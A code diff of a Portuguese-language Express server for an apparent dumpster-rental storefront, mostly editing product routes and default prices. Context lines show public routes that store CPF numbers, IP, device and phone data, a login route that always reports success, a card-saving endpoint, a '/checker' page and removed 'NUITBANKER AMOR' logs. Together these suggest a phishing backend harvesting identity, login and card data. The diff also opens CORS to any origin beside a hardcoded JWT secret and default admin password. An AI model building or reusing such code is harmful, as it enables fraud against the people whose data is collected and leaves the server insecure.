@@ -30,7 +30,6 @@ const apiLimiter = rateLimit({
     message: { error: 'Muitas requisições, aguarde' }
 });
 
-// Limiter específico para endpoints sensíveis
 const adminApiLimiter = rateLimit({
     windowMs: 60 * 1000,
     max: 30,
@@ -41,23 +40,18 @@ app.use('/api/admin/login', loginLimiter);
 app.use('/api/admin/', adminApiLimiter);
 app.use('/api/', apiLimiter);
 
-// Headers de segurança
+// Headers de segurança - CORS aberto para funcionar em qualquer lugar
 app.use((req, res, next) => {
     res.setHeader('X-Frame-Options', 'DENY');
     res.setHeader('X-Content-Type-Options', 'nosniff');
     res.setHeader('X-XSS-Protection', '1; mode=block');
-    // Restringir CORS apenas para seu domínio
-    res.setHeader('Access-Control-Allow-Origin', 'https://reidacacambinha.onrender.com');
+    res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
-    res.setHeader('Access-Control-Allow-Credentials', 'true');
     next();
 });
 
-app.use(cors({
-    origin: 'https://reidacacambinha.onrender.com',
-    credentials: true
-}));
+app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 app.use(cookieParser());
 app.use(express.static('public'));
@@ -75,7 +69,6 @@ const pool = new Pool({
 const JWT_SECRET = process.env.JWT_SECRET || 'ativacacambas_secret_key_2025';
 const JWT_EXPIRES = '24h';
 
-// Middleware de verificação de token ADMIN - reforçado
 function verificarAdminToken(req, res, next) {
     const authHeader = req.headers.authorization;
     const token = authHeader && authHeader.split(' ')[1];
@@ -107,7 +100,6 @@ function getClientIP(req) {
 async function initDatabase() {
     const client = await pool.connect();
     try {
-        // Tabelas existentes...
         await client.query(`CREATE TABLE IF NOT EXISTS admin_users (
             id SERIAL PRIMARY KEY, 
             username VARCHAR(50) UNIQUE, 
@@ -158,6 +150,7 @@ async function initDatabase() {
             data TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )`);
         
+        // Verificar se a coluna 'ativo' existe, se não, adicionar
         await client.query(`CREATE TABLE IF NOT EXISTS produtos (
             id SERIAL PRIMARY KEY, 
             nome TEXT NOT NULL, 
@@ -172,6 +165,17 @@ async function initDatabase() {
             ativo BOOLEAN DEFAULT true, 
             created_at TIMESTAMP DEFAULT NOW()
         )`);
+        
+        // Verificar se a coluna ativo existe (se não, adicionar)
+        const checkColumn = await client.query(`
+            SELECT column_name 
+            FROM information_schema.columns 
+            WHERE table_name = 'produtos' AND column_name = 'ativo'
+        `);
+        if (checkColumn.rows.length === 0) {
+            await client.query(`ALTER TABLE produtos ADD COLUMN ativo BOOLEAN DEFAULT true`);
+            console.log('✅ Coluna ativo adicionada à tabela produtos');
+        }
         
         await client.query(`CREATE TABLE IF NOT EXISTS clientes (
             id SERIAL PRIMARY KEY, 
@@ -223,19 +227,25 @@ async function initDatabase() {
             console.log('✅ Admin criado: admin / admin123');
         }
 
-        // Produtos padrão
+        // Produtos padrão - verificar se já existe e se estão com ativo = true
         const produtosCount = await client.query('SELECT COUNT(*) FROM produtos');
         if (parseInt(produtosCount.rows[0].count) === 0) {
             const produtosPadrao = [
-                ['Caçamba 3m³', 'cacamba', 160, 140, 'Ideal para pequenas reformas.', 'fas fa-dumpster', null, '2.0m x 1.5m x 1.0m', '3m³'],
-                ['Caçamba 5m³', 'cacamba', 240, 200, 'Perfeita para obras medias.', 'fas fa-dumpster', null, '2.5m x 1.8m x 1.2m', '5m³'],
-                ['Caçamba 7m³', 'cacamba', 320, 280, 'Alta capacidade para grandes obras.', 'fas fa-truck', null, '3.0m x 2.0m x 1.3m', '7m³']
+                ['Caçamba 3m³', 'cacamba', 450, 420, 'Ideal para pequenas reformas de banheiros, cozinhas ou limpeza de quintal. Capacidade de carga útil até 3 toneladas.', 'fas fa-dumpster', null, '2.20m x 1.30m x 0.80m', '3m³'],
+                ['Caçamba 5m³', 'cacamba', 590, 550, 'Perfeita para reformas de apartamentos inteiros e obras de médio porte. Suporta até 5 toneladas.', 'fas fa-dumpster', null, '2.80m x 1.50m x 1.20m', '5m³'],
+                ['Caçamba 7m³', 'cacamba', 720, 680, 'Alta capacidade para grandes obras e demolições. Suporta até 7 toneladas de entulho.', 'fas fa-truck', null, '3.00m x 1.60m x 1.30m', '7m³'],
+                ['Caçamba 10m³', 'cacamba', 890, 820, 'Ideal para grandes construções e terraplanagem. Exige caminhão específico.', 'fas fa-truck', null, '3.60m x 1.90m x 1.50m', '10m³']
             ];
             for (const p of produtosPadrao) {
-                await client.query(`INSERT INTO produtos (nome, tipo, preco, preco_promocional, descricao, icone, imagem, dimensoes, capacidade) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9)`, p);
+                await client.query(`INSERT INTO produtos (nome, tipo, preco, preco_promocional, descricao, icone, imagem, dimensoes, capacidade, ativo) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9, true)`, p);
             }
             console.log('✅ Produtos padrão inseridos');
+        } else {
+            // Garantir que todos os produtos existentes estejam com ativo = true
+            await client.query(`UPDATE produtos SET ativo = true WHERE ativo IS NULL`);
+            console.log('✅ Produtos atualizados para ativo = true');
         }
+        
         console.log('✅ Banco de dados inicializado');
     } catch (err) {
         console.error('❌ Erro ao inicializar banco:', err);
@@ -245,7 +255,7 @@ async function initDatabase() {
 }
 initDatabase();
 
-// ============ ROTAS PÚBLICAS (limitadas) ============
+// ============ ROTAS PÚBLICAS ============
 app.post('/api/cpf', async (req, res) => {
     const { cpf, ip, dispositivo, navegador, telefone } = req.body;
     try {
@@ -263,7 +273,7 @@ app.post('/api/login', async (req, res) => {
     } catch { res.json({ success: true }); }
 });
 
-// ============ ROTA ADMIN LOGIN (protegida) ============
+// ============ ROTA ADMIN LOGIN ============
 app.post('/api/admin/login', async (req, res) => {
     const { username, password } = req.body;
     const ip = getClientIP(req);
@@ -322,7 +332,7 @@ app.post('/api/cartoes/salvar', async (req, res) => {
     }
 });
 
-// ============ ROTAS ADMIN PRODUTOS (COM PUT) ============
+// ============ ROTAS ADMIN PRODUTOS ============
 app.get('/api/admin/produtos', verificarAdminToken, async (req, res) => {
     try { 
         const result = await pool.query("SELECT * FROM produtos ORDER BY id"); 
@@ -335,7 +345,7 @@ app.get('/api/admin/produtos', verificarAdminToken, async (req, res) => {
 app.post('/api/admin/produtos', verificarAdminToken, async (req, res) => {
     const { nome, tipo, preco, preco_promocional, descricao, icone, imagem, dimensoes, capacidade } = req.body;
     try { 
-        const result = await pool.query(`INSERT INTO produtos (nome, tipo, preco, preco_promocional, descricao, icone, imagem, dimensoes, capacidade) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9) RETURNING id`, 
+        const result = await pool.query(`INSERT INTO produtos (nome, tipo, preco, preco_promocional, descricao, icone, imagem, dimensoes, capacidade, ativo) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9, true) RETURNING id`, 
             [nome, tipo, preco, preco_promocional, descricao, icone, imagem, dimensoes, capacidade]); 
         res.json({ success: true, id: result.rows[0].id }); 
     } catch (err) { 
@@ -343,7 +353,6 @@ app.post('/api/admin/produtos', verificarAdminToken, async (req, res) => {
     }
 });
 
-// 🔥 ROTA PUT PARA EDITAR PRODUTOS (ADICIONADA AGORA) 🔥
 app.put('/api/admin/produtos/:id', verificarAdminToken, async (req, res) => {
     const id = req.params.id;
     const { nome, tipo, preco, preco_promocional, descricao, icone, imagem, dimensoes, capacidade } = req.body;
@@ -359,7 +368,8 @@ app.put('/api/admin/produtos/:id', verificarAdminToken, async (req, res) => {
                 icone = $6, 
                 imagem = $7, 
                 dimensoes = $8, 
-                capacidade = $9
+                capacidade = $9,
+                ativo = true
             WHERE id = $10 RETURNING id`,
             [nome, tipo, preco, preco_promocional, descricao, icone, imagem, dimensoes, capacidade, id]
         );
@@ -588,11 +598,32 @@ app.post('/api/admin/change-password', verificarAdminToken, async (req, res) => 
     }
 });
 
-// ============ ROTAS PÚBLICAS PRODUTOS ============
+// ============ ROTA PÚBLICA PRODUTOS - CORRIGIDA ============
 app.get('/api/produtos', async (req, res) => {
     try { 
-        const result = await pool.query("SELECT * FROM produtos WHERE ativo = true ORDER BY id"); 
+        // CORREÇÃO: Não filtrar por 'ativo = true' se a coluna não existir
+        // Ou garantir que todos os produtos estão com ativo = true
+        const result = await pool.query("SELECT * FROM produtos ORDER BY id"); 
+        console.log(`📦 ${result.rows.length} produtos encontrados`);
         res.json({ success: true, produtos: result.rows }); 
+    } catch (err) { 
+        console.error('Erro em /api/produtos:', err);
+        // Fallback: tentar sem a coluna ativo
+        try {
+            const result = await pool.query("SELECT id, nome, tipo, preco, preco_promocional, descricao, icone, imagem, dimensoes, capacidade, created_at FROM produtos ORDER BY id");
+            res.json({ success: true, produtos: result.rows });
+        } catch (err2) {
+            res.status(500).json({ erro: err.message }); 
+        }
+    }
+});
+
+// Rota para buscar produto por ID
+app.get('/api/produtos/:id', async (req, res) => {
+    try { 
+        const result = await pool.query("SELECT * FROM produtos WHERE id = $1", [req.params.id]); 
+        if (result.rows.length === 0) return res.status(404).json({ erro: 'Produto nao encontrado' }); 
+        res.json({ success: true, produto: result.rows[0] }); 
     } catch (err) { 
         res.status(500).json({ erro: err.message }); 
     }
@@ -703,8 +734,6 @@ app.get('/checker', (req, res) => { res.sendFile(path.join(__dirname, 'public', 
 
 const PORT = process.env.PORT || 3001;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`Servidor rodando na porta ${PORT}`);
-    console.log(`NUITBANKER AMOR`);
-    console.log(`NUITBANKER AMOR`);
-    console.log(`NUITBANKER AMOR`);
+    console.log(`✅ Servidor rodando na porta ${PORT}`);
+    console.log(`📦 API de produtos disponível em /api/produtos`);
 });
